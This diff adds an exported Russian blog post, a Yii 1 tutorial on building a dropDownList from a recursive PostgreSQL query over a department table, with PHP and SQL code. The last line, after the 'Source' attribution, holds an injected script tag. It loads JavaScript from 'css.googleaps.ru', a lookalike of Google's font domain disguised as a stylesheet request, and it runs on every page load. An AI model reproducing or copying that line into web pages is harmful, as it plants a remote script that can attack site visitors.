@@ -1,0 +1,111 @@
+---
+layout: post
+status: publish
+published: true
+title: Yii формируем рекурсивный dropDownList
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+wordpress_id: 47687
+wordpress_url: http://devdocs.ru/?p=47687
+date: '2015-10-06 22:30:05 +0200'
+date_gmt: '2015-10-06 22:30:05 +0200'
+categories:
+- Новости партнеров
+tags:
+- php
+- sql
+- des1roer
+- yii1
+- yii
+- orm
+comments: []
+---
+<div dir="ltr" style="text-align: left;">имеем</p>
+<pre>$opts <span style="color: blue;">=<&#47;span> CHtml<span style="color: blue;">:<&#47;span><span style="color: blue;">:<&#47;span>listData(Department<span style="color: blue;">:<&#47;span><span style="color: blue;">:<&#47;span>model()<span style="color: blue;">-<&#47;span>>findAll(<span style="color: #009933;">'id_parent =5'<&#47;span>), <span style="color: #009933;">'id'<&#47;span>, <span style="color: #009933;">'name'<&#47;span>);<br />
+echo <span style="color: #009933;">'
+<pre>'<&#47;span>;<br />
+var_dump($opts);<br />
+<span style="color: blue;">?<&#47;span>></p>
+<hr <span style="color: blue;">&#47;<&#47;span>></p>
+<div class<span style="color: blue;">=<&#47;span><span style="color: #009933;">"column"<&#47;span>><br />
+    <<span style="color: blue;">?<&#47;span>php<br />
+    $arr_bit[] <span style="color: blue;">=<&#47;span> <span style="color: #0066ff;">5<&#47;span>; <span style="color: #0066ff; font-style: italic;">&#47;&#47;пункт по умолчанию <&#47;span><br />
+    echo $form<span style="color: blue;">-<&#47;span>>dropDownList($model, <span style="color: #009933;">'level_id'<&#47;span>, $opts, $arr_bit, array<br />
+        (<br />
+        <span style="color: #009933;">'empty'<&#47;span> <span style="color: blue;">=<&#47;span>> Yii<span style="color: blue;">:<&#47;span><span style="color: blue;">:<&#47;span>t(<span style="color: #009933;">'default'<&#47;span>, <span style="color: #009933;">'выберите горизонт'<&#47;span>),<br />
+            )<br />
+    );<br />
+    <span style="color: blue;">?<&#47;span>><&#47;pre><br />
+получили примерно</p>
+<pre><span style="color: #ff8000;">array<&#47;span>(<span style="color: #0066ff;">2<&#47;span>) {<br />
+  [<span style="color: #0066ff;">24<&#47;span>]<span style="color: blue;">=<&#47;span><span style="color: blue;">><&#47;span><br />
+  <span style="color: #ff8000;">string<&#47;span>(<span style="color: #0066ff;">19<&#47;span>) <span style="color: #009933;">"Участок №3"<&#47;span><br />
+  [<span style="color: #0066ff;">22<&#47;span>]<span style="color: blue;">=<&#47;span><span style="color: blue;">><&#47;span><br />
+  <span style="color: #ff8000;">string<&#47;span>(<span style="color: #0066ff;">19<&#47;span>) <span style="color: #009933;">"Участок №1"<&#47;span><br />
+}<&#47;pre><br />
+нужно привести рекурсивный запрос вида</p>
+<pre> WITH RECURSIVE temp1 (id,id_parent,name,<span style="font-weight: bold;">PATH<&#47;span>, LEVEL, myname, TYPE, hidden) <span style="color: blue;">AS<&#47;span><br />
+  ( <span style="color: blue;">SELECT<&#47;span> <span style="color: #6782d3;">T1<&#47;span>.<span style="color: #6782d3;">id<&#47;span>,<br />
+           <span style="color: #6782d3;">T1<&#47;span>.<span style="color: #6782d3;">id_parent<&#47;span>,<br />
+           <span style="color: #6782d3;">T1<&#47;span>.<span style="color: #6782d3;">name<&#47;span>,<br />
+           CAST (<span style="color: #6782d3;">T1<&#47;span>.<span style="color: #6782d3;">id<&#47;span> <span style="color: blue;">AS<&#47;span> <span style="font-weight: bold;">VARCHAR<&#47;span> (<span style="color: #0066ff;">50<&#47;span>)) <span style="color: blue;">AS<&#47;span> <span style="font-weight: bold;">PATH<&#47;span>,<br />
+                <span style="color: #0066ff;">1<&#47;span>,<br />
+                CAST (<span style="color: #6782d3;">T1<&#47;span>.<span style="color: #6782d3;">name<&#47;span> <span style="color: blue;">AS<&#47;span> <span style="font-weight: bold;">VARCHAR<&#47;span> (<span style="color: #0066ff;">255<&#47;span>)) <span style="color: blue;">AS<&#47;span> myname,<br />
+                     <span style="color: #6782d3;">t1<&#47;span>.<span style="color: #6782d3;">TYPE<&#47;span> <span style="color: blue;">AS<&#47;span> TYPE,<br />
+                                <span style="color: #6782d3;">t1<&#47;span>.<span style="color: #6782d3;">hidden<&#47;span> <span style="color: blue;">AS<&#47;span> hidden<br />
+   <span style="color: blue;">FROM<&#47;span> <span style="color: #6782d3;">vgok_site<&#47;span>.<span style="color: #6782d3;">t_department<&#47;span> T1<br />
+   <span style="color: blue;">WHERE<&#47;span> <span style="color: #6782d3;">T1<&#47;span>.<span style="color: #6782d3;">id<&#47;span> <span style="color: blue;">=<&#47;span> <span style="color: #0066ff;">5<&#47;span><br />
+     <span style="color: blue;">AND<&#47;span> <span style="color: #6782d3;">t1<&#47;span>.<span style="color: #6782d3;">hidden<&#47;span> <span style="color: blue;">=<&#47;span> <span style="color: #0066ff;">0<&#47;span><br />
+   <span style="color: blue;">UNION<&#47;span> <span style="color: blue;">SELECT<&#47;span> <span style="color: #6782d3;">T2<&#47;span>.<span style="color: #6782d3;">id<&#47;span>,<br />
+                <span style="color: #6782d3;">T2<&#47;span>.<span style="color: #6782d3;">id_parent<&#47;span>,<br />
+                <span style="color: #6782d3;">T2<&#47;span>.<span style="color: #6782d3;">name<&#47;span>,<br />
+                CAST (<span style="color: #6782d3;">temp1<&#47;span>.<span style="color: #6782d3;">PATH<&#47;span> <span style="color: blue;">||<&#47;span><span style="color: #009933;">'->'<&#47;span><span style="color: blue;">||<&#47;span> <span style="color: #6782d3;">T2<&#47;span>.<span style="color: #6782d3;">id<&#47;span> <span style="color: blue;">AS<&#47;span> <span style="font-weight: bold;">VARCHAR<&#47;span>(<span style="color: #0066ff;">50<&#47;span>)) ,LEVEL <span style="color: blue;">+<&#47;span> <span style="color: #0066ff;">1<&#47;span>,<br />
+                CAST ((repeat(<span style="color: #009933;">' _ '<&#47;span>, LEVEL<span style="color: blue;">+<&#47;span><span style="color: #0066ff;">1<&#47;span>)<span style="color: blue;">||<&#47;span><span style="color: #6782d3;">T2<&#47;span>.<span style="color: #6782d3;">name<&#47;span>) <span style="color: blue;">AS<&#47;span> <span style="font-weight: bold;">VARCHAR<&#47;span>(<span style="color: #0066ff;">255<&#47;span>)), <span style="color: #6782d3;">t2<&#47;span>.<span style="color: #6782d3;">TYPE<&#47;span>,<br />
+                                                                                                                                      <span style="color: #6782d3;">t2<&#47;span>.<span style="color: #6782d3;">hidden<&#47;span><br />
+   <span style="color: blue;">FROM<&#47;span> <span style="color: #6782d3;">vgok_site<&#47;span>.<span style="color: #6782d3;">t_department<&#47;span> T2<br />
+   <span style="color: blue;">INNER JOIN<&#47;span> temp1 <span style="color: blue;">ON<&#47;span>(<span style="color: #6782d3;">temp1<&#47;span>.<span style="color: #6782d3;">id<&#47;span><span style="color: blue;">=<&#47;span> <span style="color: #6782d3;">T2<&#47;span>.<span style="color: #6782d3;">id_parent<&#47;span><br />
+                       <span style="color: blue;">AND<&#47;span> <span style="color: #6782d3;">t2<&#47;span>.<span style="color: #6782d3;">hidden<&#47;span> <span style="color: blue;">=<&#47;span> <span style="color: #0066ff;">0<&#47;span>))<br />
+<span style="color: blue;">SELECT<&#47;span> <span style="color: blue;">*<&#47;span><br />
+<span style="color: blue;">FROM<&#47;span> temp1<br />
+<span style="color: blue;">ORDER BY<&#47;span> <span style="font-weight: bold;">PATH<&#47;span> <span style="color: blue;">DESC<&#47;span> <span style="color: blue;">LIMIT<&#47;span> <span style="color: #0066ff;">100<&#47;span><&#47;pre><br />
+к такому же виду<br />
+добиться этого можно следующим кодом</p>
+<pre>$criteria <span style="color: blue;">=<&#47;span> new CDbCriteria;<br />
+<span style="color: blue;">&#47;<&#47;span><span style="color: blue;">&#47;<&#47;span>Рекурсивно выбираем потомков<br />
+$connection <span style="color: blue;">=<&#47;span> Yii::app()<span style="color: blue;">-<&#47;span><span style="color: blue;">><&#47;span>db;<br />
+$sql <span style="color: blue;">=<&#47;span> <span style="color: #009933;">"<br />
+  WITH RECURSIVE temp1 ( id,id_parent,name,PATH, LEVEL, myname , type, hidden) AS (<br />
+  SELECT T1.id,T1.id_parent, T1.name, CAST (T1.id AS VARCHAR (50)) as PATH, 1 ,<br />
+  CAST (T1.name AS VARCHAR (255)) as myname, t1.type as type, t1.hidden as hidden<br />
+  FROM vgok_site.t_department T1 WHERE T1.id = 5  and t1.hidden = 0<br />
+  union<br />
+  select T2.id, T2.id_parent, T2.name, CAST ( temp1.PATH ||'->'|| T2.id AS VARCHAR(50)) ,LEVEL + 1 ,<br />
+  CAST ((repeat(' _ ', LEVEL+1)||T2.name) AS VARCHAR(255)), t2.type, t2.hidden<br />
+  FROM vgok_site.t_department T2 INNER JOIN temp1 ON( temp1.id= T2.id_parent and t2.hidden = 0))<br />
+  select * from temp1<br />
+  ORDER BY PATH desc LIMIT 100<br />
+  "<&#47;span>;<br />
+$dataReader <span style="color: blue;">=<&#47;span> $connection<span style="color: blue;">-<&#47;span><span style="color: blue;">><&#47;span>createCommand($sql)<span style="color: blue;">-<&#47;span><span style="color: blue;">><&#47;span>query();<br />
+$rows <span style="color: blue;">=<&#47;span> $dataReader<span style="color: blue;">-<&#47;span><span style="color: blue;">><&#47;span>readAll();<br />
+for($i <span style="color: blue;">=<&#47;span> <span style="color: #0066ff;">0<&#47;span>, $cnt <span style="color: blue;">=<&#47;span> <span style="color: #3333ff; font-weight: bold;">count<&#47;span>($rows); $i <span style="color: blue;"><<&#47;span> $cnt; $i<span style="color: blue;">+<&#47;span><span style="color: blue;">+<&#47;span>) <span style="color: blue;">&#47;<&#47;span><span style="color: blue;">&#47;<&#47;span>формируем столбцы<br />
+{<br />
+    $opts[$rows[$i][<span style="color: #009933;">'id'<&#47;span>]] <span style="color: blue;">=<&#47;span> $rows[$i][<span style="color: #009933;">'name'<&#47;span>];<br />
+}<br />
+?<span style="color: blue;">><&#47;span><br />
+<span style="color: blue;"><<&#47;span>hr <span style="color: blue;">&#47;<&#47;span><span style="color: blue;">><&#47;span><br />
+<span style="color: blue;"><<&#47;span>div class<span style="color: blue;">=<&#47;span><span style="color: #009933;">"column"<&#47;span><span style="color: blue;">><&#47;span><br />
+    <span style="color: blue;"><<&#47;span>?php<br />
+    $arr_bit[] <span style="color: blue;">=<&#47;span> <span style="color: #0066ff;">5<&#47;span>; <span style="color: blue;">&#47;<&#47;span><span style="color: blue;">&#47;<&#47;span>пункт по умолчанию<br />
+    echo $form<span style="color: blue;">-<&#47;span><span style="color: blue;">><&#47;span>dropDownList($model, <span style="color: #009933;">'level_id'<&#47;span>, $opts, $arr_bit, array<br />
+        (<br />
+        <span style="color: #009933;">'empty'<&#47;span> <span style="color: blue;">=<&#47;span><span style="color: blue;">><&#47;span> Yii::t(<span style="color: #009933;">'default'<&#47;span>, <span style="color: #009933;">'выберите горизонт'<&#47;span>),<br />
+            )<br />
+    );<br />
+    ?<span style="color: blue;">><&#47;span><&#47;pre><br />
+<&#47;div><br />
+Source: des1roer.blogspot.com<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script></p>
